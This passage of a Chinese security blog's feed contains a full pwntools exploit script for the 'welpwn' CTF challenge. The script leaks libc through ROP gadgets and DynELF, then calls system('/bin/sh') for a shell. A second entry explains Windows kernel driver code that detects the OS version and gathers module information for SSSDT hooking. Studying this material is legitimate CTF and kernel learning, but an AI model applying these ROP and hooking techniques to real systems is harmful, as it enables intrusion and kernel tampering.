class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;welpwn&#x27;</span>)</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;welpwn&#x27;</span>)</span><br><span class="line"></span><br><span class="line">read_got = elf.symbols[<span class="string">&#x27;got.read&#x27;</span>]</span><br><span class="line">log.info(<span class="string">&quot;read_got = &quot;</span> + <span class="built_in">hex</span>(read_got))</span><br><span class="line"></span><br><span class="line">write_got = elf.symbols[<span class="string">&#x27;got.write&#x27;</span>]</span><br><span class="line">log.info(<span class="string">&quot;write_got = &quot;</span> + <span class="built_in">hex</span>(write_got))</span><br><span class="line"></span><br><span class="line">main = elf.symbols[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">log.info(<span class="string">&quot;main = &quot;</span> + <span class="built_in">hex</span>(main))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">buflen = <span class="number">24</span></span><br><span class="line"></span><br><span class="line">mmmcall = <span class="number">0x400880</span></span><br><span class="line">ppppppr = <span class="number">0x40089a</span></span><br><span class="line">ppppr = <span class="number">0x40089c</span></span><br><span class="line"></span><br><span class="line">padding = <span class="number">0xdeadbeef</span></span><br><span class="line"></span><br><span class="line">flag = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">leak</span>(<span class="params">address</span>):</span><br><span class="line">    <span class="keyword">global</span> flag</span><br><span class="line">    payload = <span class="string">&quot;&quot;</span></span><br><span class="line">    payload += <span class="string">&quot;Q&quot;</span> * buflen</span><br><span class="line">    payload += p64(ppppr)       </span><br><span class="line">    payload += p64(ppppppr)</span><br><span class="line">    rbx = <span class="number">0</span></span><br><span class="line">    rbp = <span class="number">1</span></span><br><span class="line">    r12 = write_got</span><br><span class="line">    r13 = <span class="number">8</span></span><br><span class="line">    r14 = address</span><br><span class="line">    r15 = <span class="number">1</span></span><br><span class="line">    ret = mmmcall</span><br><span class="line">    payload += p64(rbx) + p64(rbp) + p64(r12) + p64(r13) + p64(r14) + p64(r15) + p64(ret)</span><br><span class="line">    ret = main</span><br><span class="line">    payload += p64(padding) * <span class="number">7</span> + p64(ret)</span><br><span class="line"></span><br><span class="line">    p.recvuntil(<span class="string">&#x27;RCTF\n&#x27;</span>)</span><br><span class="line">    p.sendline(payload)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> flag:</span><br><span class="line">        p.recv(<span class="number">0x1b</span>)</span><br><span class="line">    data = p.recv(<span class="number">8</span>)</span><br><span class="line">    log.info(<span class="string">&quot;recv: &quot;</span> + <span class="built_in">str</span>(data))</span><br><span class="line">    flag += <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line">d = DynELF(leak, elf=ELF(<span class="string">&#x27;welpwn&#x27;</span>))</span><br><span class="line"></span><br><span class="line">system = d.lookup(<span class="string">&#x27;system&#x27;</span>, <span class="string">&#x27;libc&#x27;</span>)</span><br><span class="line">log.info(<span class="string">&quot;system addr = &quot;</span> + <span class="built_in">hex</span>(system))</span><br><span class="line"></span><br><span class="line">bss = <span class="number">0x601300</span></span><br><span class="line">payload = <span class="string">&quot;&quot;</span></span><br><span class="line">payload += <span class="string">&quot;P&quot;</span> * buflen</span><br><span class="line">payload += p64(ppppr)</span><br><span class="line">payload += p64(ppppppr)</span><br><span class="line">rbx = <span class="number">0</span></span><br><span class="line">rbp = <span class="number">1</span></span><br><span class="line">r12 = read_got</span><br><span class="line">r13 = <span class="number">17</span></span><br><span class="line">r14 = bss</span><br><span class="line">r15 = <span class="number">0</span></span><br><span class="line">ret = mmmcall</span><br><span class="line">payload += p64(rbx) + p64(rbp) + p64(r12) + p64(r13) + p64(r14) + p64(r15) + p64(ret)</span><br><span class="line">ret = main</span><br><span class="line">payload += p64(padding) * <span class="number">7</span> + p64(ret)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;RCTF\n&quot;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;/bin/sh\0&quot;</span>+ p64(system))</span><br><span class="line"></span><br><span class="line">check = <span class="string">&quot;&quot;</span></span><br><span class="line">check += <span class="string">&quot;C&quot;</span> * buflen</span><br><span class="line">check += p64(ppppr)</span><br><span class="line">check += p64(ppppppr)</span><br><span class="line">rbx = <span class="number">0</span></span><br><span class="line">rbp = <span class="number">1</span></span><br><span class="line">r12 = write_got</span><br><span class="line">r13 = <span class="number">16</span></span><br><span class="line">r14 = bss</span><br><span class="line">r15 = <span class="number">1</span></span><br><span class="line">ret = mmmcall</span><br><span class="line">check += p64(rbx) + p64(rbp) + p64(r12) + p64(r13) + p64(r14) + p64(r15) + p64(ret)</span><br><span class="line">ret = main</span><br><span class="line">check += p64(padding) * <span class="number">7</span> + p64(ret)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;RCTF\n&quot;</span>)</span><br><span class="line">p.sendline(check)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">p.recv(<span class="number">0x1b</span>)</span><br><span class="line">log.info(<span class="string">&quot;recv:&quot;</span> + p.recv(<span class="number">16</span>).encode(<span class="string">&#x27;hex&#x27;</span>))</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;&quot;</span></span><br><span class="line">payload += <span class="string">&quot;R&quot;</span> * buflen</span><br><span class="line">payload += p64(ppppr)</span><br><span class="line">payload += p64(ppppppr)</span><br><span class="line">rbx = <span class="number">0</span></span><br><span class="line">rbp = <span class="number">1</span></span><br><span class="line">r12 = bss+<span class="number">0x8</span></span><br><span class="line">r13 = bss</span><br><span class="line">r14 = bss</span><br><span class="line">r15 = bss</span><br><span class="line">ret = mmmcall</span><br><span class="line">payload += p64(rbx) + p64(rbp) + p64(r12) + p64(r13) + p64(r14) + p64(r15) + p64(ret)</span><br><span class="line">ret = main</span><br><span class="line">payload += p64(padding) * <span class="number">7</span> + p64(ret)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;RCTF\n&quot;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line">p.recv()</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;基于pwntools编写pwn代码&quot;&gt;&lt;a href=&quot;#基于pwntools编写pwn代码&quot; class=&quot;headerlink&quot; title=&quot;基于pwntools编写pwn代码&quot;&gt;&lt;/a&gt;基于pwntools编写pwn代码&lt;/h1&gt;&lt;h2 id=&quot;背景&quot;&gt;&lt;</summary>
      
    
    
    
    <category term="PWN" scheme="https://qianmuoy.github.io/categories/PWN/"/>
    
    
  </entry>
  
  <entry>
    <title>获取系统信息</title>
    <link href="https://qianmuoy.github.io/2024/03/09/%E8%8E%B7%E5%8F%96%E7%B3%BB%E7%BB%9F%E4%BF%A1%E6%81%AF/"/>
    <id>https://qianmuoy.github.io/2024/03/09/%E8%8E%B7%E5%8F%96%E7%B3%BB%E7%BB%9F%E4%BF%A1%E6%81%AF/</id>
    <published>2024-03-09T12:35:12.000Z</published>
    <updated>2024-03-09T12:35:29.634Z</updated>
    
    <content type="html"><![CDATA[<h1 id="获取系统信息"><a href="#获取系统信息" class="headerlink" title="获取系统信息"></a>获取系统信息</h1><h2 id="DriverEntry"><a href="#DriverEntry" class="headerlink" title="DriverEntry"></a>DriverEntry</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">NTSTATUS</span><span class="params">(NTAPI* LPFN_RTLGETVERSION)</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    OUT PRTL_OSVERSIONINFOW OsVersionInfo)</span></span>;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">enum</span></span><br><span class="line">&#123;</span><br><span class="line">    UNKNOWN_VERSION = <span class="number">0</span>,</span><br><span class="line">    WIN2000_VERSION,</span><br><span class="line">    WINXP_VERSION,</span><br><span class="line">    WIN2003_VERSION,</span><br><span class="line">    WINVISTA_VERSION,</span><br><span class="line">    WIN7_VERSION,</span><br><span class="line">    WIN8_VERSION,</span><br><span class="line">    WIN8_VERSION_1,</span><br><span class="line">    WIN8_VERSION_1_9600,</span><br><span class="line">    WIN10_VERSION,</span><br><span class="line">    WIN10_VERSION_10240,</span><br><span class="line">    WIN10_VERSION_10586,</span><br><span class="line">&#125;OS_VERSION;</span><br><span class="line"><span class="keyword">enum</span> <span class="title class_">OS_VERSION</span> __OsVersion = UNKNOWN_VERSION;</span><br><span class="line"></span><br><span class="line">RTL_OSVERSIONINFOEXW __RtlOsVersionInfo = &#123; <span class="number">0</span> &#125;;<span class="comment">// wdm.h中定义的，保存系统版本信息的结构体</span></span><br><span class="line">UNICODE_STRING __RtlGetVersionU = <span class="built_in">RTL_CONSTANT_STRING</span>(<span class="string">L&quot;RtlGetVersion&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//系统导出的全局变量</span></span><br><span class="line"><span class="keyword">extern</span> PULONG         InitSafeBootMode;</span><br><span class="line"></span><br><span class="line"><span class="function">NTSTATUS <span class="title">DriverEntry</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    DRIVER_OBJECT* DriverObject,</span></span></span><br><span class="line"><span class="params"><span class="function">    UNICODE_STRING* RegistryPath)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    NTSTATUS           Status = STATUS_ACCESS_DENIED;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    1: kd&gt; dd InitSafeBootMode</span></span><br><span class="line"><span class="comment">849a4980  00000000 00000000 02080014 ffdf0030</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="keyword">if</span> (*InitSafeBootMode &gt; <span class="number">0</span>) </span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> STATUS_ACCESS_DENIED;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 一个全局结构体，代表系统版本信息</span></span><br><span class="line">    __RtlOsVersionInfo.dwOSVersionInfoSize = <span class="built_in">sizeof</span>(RTL_OSVERSIONINFOEXW);</span><br><span class="line">    __RtlOsVersionInfo.dwMajorVersion = <span class="number">0xFF</span>; <span class="comment">// 初始化一个无效的版本</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 从系统模块ntkrnlpa.exe的导出表中获取函数地址</span></span><br><span class="line">    __RtlGetVersion = (LPFN_RTLGETVERSION)<span class="built_in">MmGetSystemRoutineAddress</span>(&amp;__RtlGetVersionU);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (__RtlGetVersion) </span><br><span class="line">    &#123;</span><br><span class="line">        __RtlGetVersion((PRTL_OSVERSIONINFOW)&amp;__RtlOsVersionInfo);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">InitializeOsVersion</span>();  <span class="comment">//初始化系统版本信息</span></span><br><span class="line">    <span class="keyword">if</span> (__OsVersion == UNKNOWN_VERSION)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> STATUS_ACCESS_DENIED;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//Ntos.exe</span></span><br><span class="line">    <span class="comment">//Win32k.sys</span></span><br><span class="line">    <span class="comment">//Ntdll.dll</span></span><br><span class="line">    <span class="comment">//csrss.exe</span></span><br><span class="line">    Status = <span class="built_in">GetSystemInfo</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">NT_SUCCESS</span>(Status)) &#123;</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">return</span> Status;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    __DriverObject = DriverObject;</span><br><span class="line">    DriverObject-&gt;DriverUnload = DriverUnload;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="获取系统版本"><a href="#获取系统版本" class="headerlink" title="获取系统版本"></a>获取系统版本</h2><p>先判断MajorVersion，2003、 xp、 2000都是5，后面的都是6，win10是10。再判断MinorVersion，分辨win7、win8。对于win8、win10的一些小版本，通过BuildNumber来判断。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line">ULONG __BuildNumber = <span class="number">0</span>;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">InitializeOsVersion</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    ULONG BuildNumber = <span class="number">0</span>;</span><br><span class="line">    ULONG MajorVersion = <span class="number">0</span>;</span><br><span class="line">    ULONG MinorVersion = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">PsGetVersion</span>(&amp;MajorVersion, &amp;MinorVersion, &amp;BuildNumber, <span class="literal">NULL</span>);</span><br><span class="line">    __BuildNumber = BuildNumber;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 2003, xp, 2000</span></span><br><span class="line">    <span class="keyword">if</span> (MajorVersion == <span class="number">5</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">switch</span> (MinorVersion)</span><br><span class="line">        &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0</span>:     <span class="comment">// win2k</span></span><br><span class="line"></span><br><span class="line">            __OsVersion = WIN2000_VERSION;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">case</span> <span class="number">1</span>:     <span class="comment">// winxp</span></span><br><span class="line">            __OsVersion = WINXP_VERSION;</span><br><span class="line">            <span class="comment">//ReadOsServicePack();</span></span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">case</span> <span class="number">2</span>:     <span class="comment">// win2003</span></span><br><span class="line"></span><br><span class="line">            __OsVersion = WIN2003_VERSION;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (MajorVersion == <span class="number">6</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">switch</span> (MinorVersion)</span><br><span class="line">        &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line"></span><br><span class="line">            __OsVersion = WINVISTA_VERSION;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">            __OsVersion = WIN7_VERSION;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line"></span><br><span class="line">            __OsVersion = WIN8_VERSION;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">            <span class="keyword">if</span> (__BuildNumber == <span class="number">9431</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                __OsVersion = WIN8_VERSION_1;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (__BuildNumber == <span class="number">9600</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                __OsVersion = WIN8_VERSION_1_9600;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">            __OsVersion = WIN10_VERSION;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (MajorVersion == <span class="number">10</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (__BuildNumber &lt; <span class="number">10240</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            __OsVersion = WIN10_VERSION;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (__BuildNumber == <span class="number">10240</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            __OsVersion = WIN10_VERSION_10240;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (__BuildNumber == <span class="number">10586</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            __OsVersion = WIN10_VERSION_10586;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    __OsVersion = UNKNOWN_VERSION;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="获取系统信息-1"><a href="#获取系统信息-1" class="headerlink" title="获取系统信息"></a>获取系统信息</h2><ol><li><p>csrss.exe是微软客户端、服务端运行时子系统，管理Windows图形相关任务，Hook SSSDT必须。SSSDT就是win32k.sys里面的函数，大多数都跟图形相关，比如什么NtUserGetDCEx或者NtUserCreateWindowEx等。所以要查看这些内核函数地址，光在驱动中进行和SSDT一样的访问会引发异常蓝屏的。所以有前辈就想出办法，在驱动程序里面调用KeAttachProces到csrss.exe中，获取这个系统进程的地址空间从而在驱动中获取SSSDT中的函数地址</p></li><li><p>ZwQuerySystemInformation函数需要导出使用。配合枚举类型指示获取系统的什么信息。代码中获取了系统的所有模块，这个函数返回了首地址和大小。</p> <figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">NTSYSAPI NTSTATUS NTAPI <span class="title">ZwQuerySystemInformation</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    ULONG  SystemInformationClass,</span></span></span><br><span class="line"><span class="params"><span class="function">    PVOID  SystemInformation,</span></span></span><br><span class="line"><span class="params"><span class="function">    ULONG  SystemInformationLength,</span></span></span><br><span class="line"><span class="params"><span class="function">    PULONG ReturnLength</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">enum</span> <span class="title class_">_SYSTEM_INFORMATION_CLASS</span> &#123;</span><br><span class="line">    SystemBasicInformation,</span><br><span class="line">    SystemProcessorInformation, <span class="comment">// obsolete...delete</span></span><br><span class="line">    SystemPerformanceInformation,</span><br><span class="line">    SystemTimeOfDayInformation,</span><br><span class="line">    SystemPathInformation,</span><br><span class="line">    SystemProcessInformation,</span><br><span class="line">    SystemCallCountInformation,</span><br><span class="line">    SystemDeviceInformation,</span><br><span class="line">    SystemProcessorPerformanceInformation,</span><br><span class="line">    SystemFlagsInformation,</span><br><span class="line">    SystemCallTimeInformation,</span><br><span class="line">    SystemModuleInformation,</span><br><span class="line">    SystemLocksInformation,</span><br><span class="line">    SystemStackTraceInformation,</span><br><span class="line">    SystemPagedPoolInformation,</span><br><span class="line">    SystemNonPagedPoolInformation,</span><br><span class="line">    SystemHandleInformation,</span><br><span class="line">    SystemObjectInformation,</span><br><span class="line">    SystemPageFileInformation,</span><br><span class="line">    SystemVdmInstemulInformation,</span><br><span class="line">    SystemVdmBopInformation,</span><br><span class="line">    SystemFileCacheInformation,</span><br><span class="line">    SystemPoolTagInformation,</span><br><span class="line">    SystemInterruptInformation,</span><br><span class="line">    SystemDpcBehaviorInformation,</span><br><span class="line">    SystemFullMemoryInformation,</span><br><span class="line">    SystemLoadGdiDriverInformation,</span><br><span class="line">    SystemUnloadGdiDriverInformation,</span><br><span class="line">    SystemTimeAdjustmentInformation,</span><br><span class="line">    SystemSummaryMemoryInformation,</span><br><span class="line">    SystemMirrorMemoryInformation,</span><br><span class="line">    SystemPerformanceTraceInformation,</span><br><span class="line">    SystemObsolete0,</span><br><span class="line">    SystemExceptionInformation,</span><br><span class="line">    SystemCrashDumpStateInformation,</span><br><span class="line">    SystemKernelDebuggerInformation,</span><br><span class="line">    SystemContextSwitchInformation,</span><br><span class="line">    SystemRegistryQuotaInformation,</span><br><span class="line">    SystemExtendServiceTableInformation,</span><br><span class="line">    SystemPrioritySeperation,</span><br><span class="line">    SystemVerifierAddDriverInformation,</span><br><span class="line">    SystemVerifierRemoveDriverInformation,</span><br><span class="line">    SystemProcessorIdleInformation,</span><br><span class="line">    SystemLegacyDriverInformation,</span><br><span class="line">    SystemCurrentTimeZoneInformation,</span><br><span class="line">    SystemLookasideInformation,</span><br><span class="line">    SystemTimeSlipNotification,</span><br><span class="line">    SystemSessionCreate,</span><br><span class="line">    SystemSessionDetach,</span><br><span class="line">    SystemSessionInformation,</span><br><span class="line">    SystemRangeStartInformation,</span><br><span class="line">    SystemVerifierInformation,</span><br><span class="line">    SystemVerifierThunkExtend,</span><br><span class="line">    SystemSessionProcessInformation,</span><br><span class="line">    SystemLoadGdiDriverInSystemSpace,</span><br><span class="line">    SystemNumaProcessorMap,</span><br><span class="line">    SystemPrefetcherInformation,</span><br><span class="line">    SystemExtendedProcessInformation,</span><br><span class="line">    SystemRecommendedSharedDataAlignment,</span><br><span class="line">    SystemComPlusPackage,</span><br><span class="line">    SystemNumaAvailableMemory,</span><br><span class="line">    SystemProcessorPowerInformation,</span><br><span class="line">    SystemEmulationBasicInformation,</span><br><span class="line">    SystemEmulationProcessorInformation,</span><br><span class="line">    SystemExtendedHandleInformation,</span><br><span class="line">    SystemLostDelayedWriteInformation,</span><br><span class="line">    SystemBigPoolInformation,</span><br><span class="line">    SystemSessionPoolTagInformation,</span><br><span class="line">    SystemSessionMappedViewInformation,</span><br><span class="line">    SystemHotpatchInformation,</span><br><span class="line">    SystemObjectSecurityMode,</span><br><span class="line">    SystemWatchdogTimerHandler,</span><br><span class="line">    SystemWatchdogTimerInformation,</span><br><span class="line">    SystemLogicalProcessorInformation,</span><br><span class="line">    SystemWow64SharedInformation,</span><br><span class="line">    SystemRegisterFirmwareTableInformationHandler,</span><br><span class="line">    SystemFirmwareTableInformation,</span><br><span class="line">    SystemModuleInformationEx,</span><br><span class="line">    SystemVerifierTriageInformation,</span><br><span class="line">    SystemSuperfetchInformation,</span><br><span class="line">    SystemMemoryListInformation,</span><br><span class="line">    SystemFileCacheInformationEx,</span><br><span class="line">    MaxSystemInfoClass <span class="comment">// MaxSystemInfoClass should always be the last enum</span></span><br><span class="line">&#125; SYSTEM_INFORMATION_CLASS;</span><br></pre></td></tr></table></figure></li><li><p>strrchr用于从右查找字符数组第一次出现对应标识的地方，并返回指向这个被截断的数组的指针。RtlStringCchCatW连接两个字符串（Unicode），RtlStringCchCatNW限制连接的大小。</p></li><li><p>win10下，win32k.sys变为了win32kfull.sys</p></li><li><p>内核有效地址从MmSystemRangeStart开始。模块枚举不到ntdll时，可以使用内存映射的方法获取ntdll信息。</p></li><li><p>注意比较csrss.exe的最大session id不能大于10。</p></li></ol><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span 